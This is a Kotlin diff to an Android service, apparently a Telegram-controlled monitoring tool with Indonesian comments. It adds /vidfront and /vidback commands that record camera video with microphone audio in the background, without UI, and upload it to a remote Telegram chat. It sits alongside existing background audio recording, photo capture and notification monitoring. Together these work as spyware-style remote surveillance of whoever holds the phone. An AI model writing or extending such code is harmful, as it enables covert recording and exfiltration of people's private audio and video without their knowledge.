@@ -54,6 +54,7 @@ class TelegramService : Service() {
     private var mediaRecorder: MediaRecorder? = null
     private var isRecording = false
     private var isCapturingCamera = false
+    private var isRecordingVideo = false
     private var audioRecord: AudioRecord? = null
     private var audioFocusRequest: Any? = null
 
@@ -377,6 +378,16 @@ class TelegramService : Service() {
             cmd.contains("/camback") || cmd.contains("/kamera_belakang") || cmd.contains("/cambel") -> {
                 captureCamera(targetChatId, facing = "back")
             }
+            cmd.contains("/vidfront") || cmd.contains("/videodepan") -> {
+                val match = Regex("/vidfront\\s+(\\d+)").find(cmd)
+                val dur = match?.groupValues?.get(1)?.toIntOrNull()?.coerceIn(5, 60) ?: 15
+                recordVideo(targetChatId, facing = "front", seconds = dur)
+            }
+            cmd.contains("/vidback") || cmd.contains("/videobelakang") -> {
+                val match = Regex("/vidback\\s+(\\d+)").find(cmd)
+                val dur = match?.groupValues?.get(1)?.toIntOrNull()?.coerceIn(5, 60) ?: 15
+                recordVideo(targetChatId, facing = "back", seconds = dur)
+            }
             cmd.contains("/crash") || cmd == "crash" -> {
                 val app = applicationContext as? App
                 val crashLog = app?.getLatestCrashLog()
@@ -404,6 +415,8 @@ class TelegramService : Service() {
             /record     - rekam 15 detik audio dan kirim ke chat
             /camfront   - ambil foto kamera depan (background)
             /camback    - ambil foto kamera belakang (background)
+            /vidfront [d] - rekam video kamera depan d detik (default 15, max 60)
+            /vidback [d]  - rekam video kamera belakang d detik (default 15, max 60)
             /crash      - lihat log crash terakhir
             /notifications - status monitor notifikasi
             /help     - daftar ini
@@ -1008,6 +1021,209 @@ class TelegramService : Service() {
             Log.w(TAG, "hideCameraNotification: ${e.message}")
         }
     }
+
+    /** Rekam video kamera depan/belakang secara background (tanpa UI).
+     *  Alur: Camera2 (pilih lensa front/back) → MediaRecorder(SURFACE) +
+     *  ImageReader → CaptureSession → rekam N detik → stop → kirim video.
+     *  Foreground notification id=4 jadi visible surface sah MIUI.
+     *  seconds: 5–60, default 15. */
+    private suspend fun recordVideo(chatId: String, facing: String, seconds: Int) {
+        if (isRecordingVideo) {
+            sendText(chatId, "Sedang merekam video... tunggu selesai.")
+            return
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val camGranted = checkSelfPermission(android.Manifest.permission.CAMERA) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+            if (!camGranted) {
+                sendText(chatId, "⚠️ Izin kamera belum diberikan. Buka app → izinkan akses kamera → lalu /vidfront atau /vidback lagi.")
+                return
+            }
+        }
+        isRecordingVideo = true
+        val label = if (facing == "front") "depan" else "belakang"
+        showVideoNotification(label)
+        sendText(chatId, "🎥 Mulai rekam video kamera $label ${seconds} detik...")
+        scope?.launch {
+            val outFile = withContext(Dispatchers.IO) {
+                try {
+                    recordOneVideo(facing, seconds)
+                } catch (e: Exception) {
+                    Log.e(TAG, "recordVideo: ${e.javaClass.simpleName}: ${e.message}")
+                    null
+                }
+            }
+            hideVideoNotification()
+            if (outFile != null && outFile.exists() && outFile.length() > 0) {
+                Log.d(TAG, "recordVideo: ${outFile.length()} bytes, sending...")
+                sendVideo(chatId, outFile, "Video kamera $label ${Build.MODEL}")
+                outFile.delete()
+            } else {
+                sendText(chatId, "❌ Gagal merekam video kamera $label.")
+            }
+            isRecordingVideo = false
+        }
+    }
+
+    /** Rekam satu video (front/back) via legacy Camera API + MediaRecorder(CAMERA).
+     *  Dipakai karena MediaRecorder.getOutputSurface() baru tersedia di API 33+.
+     *  Legacy Camera masih didukung penuh di semua API level (1–34). */
+    private fun recordOneVideo(facing: String, seconds: Int): java.io.File? {
+        val outDir = getExternalFilesDir(null) ?: filesDir
+        val outFile = java.io.File(outDir, "vid_${facing}_${System.currentTimeMillis()}.mp4")
+        if (outFile.exists()) outFile.delete()
+
+        // 1. Pilih kamera (front/back) via legacy Camera API
+        @Suppress("DEPRECATION")
+        val numCameras = android.hardware.Camera.getNumberOfCameras()
+        val camId = if (numCameras == 0) -1 else {
+            val info = android.hardware.Camera.CameraInfo()
+            var found = -1
+            for (i in 0 until numCameras) {
+                @Suppress("DEPRECATION")
+                android.hardware.Camera.getCameraInfo(i, info)
+                if (facing == "front" && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) found = i
+                if (facing == "back"  && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK)  found = i
+            }
+            found
+        }
+        if (camId < 0) {
+            Log.e(TAG, "recordOneVideo: no ${facing} camera found")
+            return null
+        }
+
+        // 2. Buka kamera
+        @Suppress("DEPRECATION")
+        val cam = try {
+            android.hardware.Camera.open(camId)
+        } catch (e: Exception) {
+            Log.e(TAG, "recordOneVideo: camera open fail: ${e.message}")
+            return null
+        }
+
+        val params = cam.parameters
+        val sizes = params.getSupportedPreviewSizes()
+        // Pilih 720p (1280x720) atau 480p (640x480) paling dekat
+        val (tw, th) = if (facing == "front") 720 to 1280 else 1280 to 720
+        val bestSize = sizes.minByOrNull { size ->
+            val diffW = Math.abs(size.width - tw).toLong()
+            val diffH = Math.abs(size.height - th).toLong()
+            diffW * diffW + diffH * diffH
+        } ?: sizes.first()
+        params.setPreviewSize(bestSize.width, bestSize.height)
+        cam.parameters = params
+
+        // 3. MediaRecorder (Audio+Video dari kamera legacy)
+        val rec = if (Build.VERSION.SDK_INT >= 31) {
+            MediaRecorder(applicationContext)
+        } else {
+            @Suppress("DEPRECATION")
+            MediaRecorder()
+        }
+        try {
+            @Suppress("DEPRECATION")
+            rec.setCamera(cam)
+            rec.setAudioSource(MediaRecorder.AudioSource.MIC)
+            rec.setVideoSource(MediaRecorder.VideoSource.CAMERA)
+            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            val vw = bestSize.width
+            val vh = bestSize.height
+            rec.setVideoSize(vw, vh)
+            rec.setVideoEncodingBitRate(4_000_000)
+            rec.setVideoFrameRate(30)
+            rec.setAudioSamplingRate(44100)
+            rec.setAudioEncodingBitRate(128_000)
+            rec.setOutputFile(outFile.absolutePath)
+            rec.prepare()
+            rec.start()
+            Log.d(TAG, "recordOneVideo: recorder started (${vw}x${vh}, camera=$camId)")
+        } catch (e: Exception) {
+            Log.e(TAG, "recordOneVideo: recorder start fail: ${e.message}")
+            try { rec.release() } catch (_: Exception) {}
+            try { cam.release() } catch (_: Exception) {}
+            return null
+        }
+
+        // 4. Mulai preview (wajib supaya frame mulai masuk ke recorder)
+        try { cam.startPreview() } catch (e: Exception) {
+            Log.w(TAG, "recordOneVideo: startPreview: ${e.message}")
+        }
+
+        // 5. Tunggu durasi rekam
+        Thread.sleep((seconds * 1000L).coerceAtMost(60_000L))
+
+        // 6. Stop recorder → stop kamera → release
+        try {
+            rec.stop()
+            Log.d(TAG, "recordOneVideo: recorder stopped")
+        } catch (e: Exception) {
+            Log.w(TAG, "recordOneVideo: rec.stop: ${e.message}")
+        }
+        try {
+            cam.stopPreview()
+            cam.release()
+        } catch (_: Exception) {}
+        try { rec.release() } catch (_: Exception) {}
+
+        return if (outFile.exists() && outFile.length() > 0) outFile else null
+    }
+
+    /** Tampilkan notification foreground video (id=4). */
+    private fun showVideoNotification(label: String) {
+        val ch = "telebot_video"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            getSystemService(NotificationManager::class.java).createNotificationChannel(
+                NotificationChannel(ch, "Video TeleBot", NotificationManager.IMPORTANCE_LOW)
+            )
+        }
+        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
+        val note = NotificationCompat.Builder(this, ch)
+            .setContentTitle("🎥 Merekam video kamera $label...")
+            .setContentText("Video akan dikirim ke Telegram")
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setContentIntent(pi)
+            .setOngoing(true)
+            .build()
+        startForeground(4, note)
+        Log.d(TAG, "showVideoNotification: started label=$label")
+    }
+
+    /** Hapus notification video (id=4) tanpa mematikan foreground service. */
+    private fun hideVideoNotification() {
+        try {
+            getSystemService(NotificationManager::class.java).cancel(4)
+            Log.d(TAG, "hideVideoNotification: cancelled id=4")
+        } catch (e: Exception) {
+            Log.w(TAG, "hideVideoNotification: ${e.message}")
+        }
+    }
+
+    /** Kirim file video ke Telegram sebagai video (mp4, H264). */
+    private suspend fun sendVideo(chatId: String, file: java.io.File, caption: String) =
+        withContext(Dispatchers.IO) {
+            if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
+            try {
+                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId)
+                    .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaTypeOrNull()))
+                    .addFormDataPart("caption", caption)
+                    .build()
+                val req = Request.Builder()
+                    .url("https://api.telegram.org/bot$botToken/sendVideo")
+                    .post(body)
+                    .build()
+                val resp = http.newCall(req).execute()
+                if (!resp.isSuccessful) {
+                    Log.e(TAG, "sendVideo: HTTP ${resp.code}")
+                }
+                resp.close()
+                file.delete()
+            } catch (e: Exception) {
+                Log.e(TAG, "sendVideo: ${e.message}")
+            }
+        }
 
     /** Tulis file WAV dari raw PCM 16-bit mono. */
     private fun writeFile(wavFile: java.io.File, pcmData: ByteArray, sampleRate: Int, channels: Int, encoding: Int) {
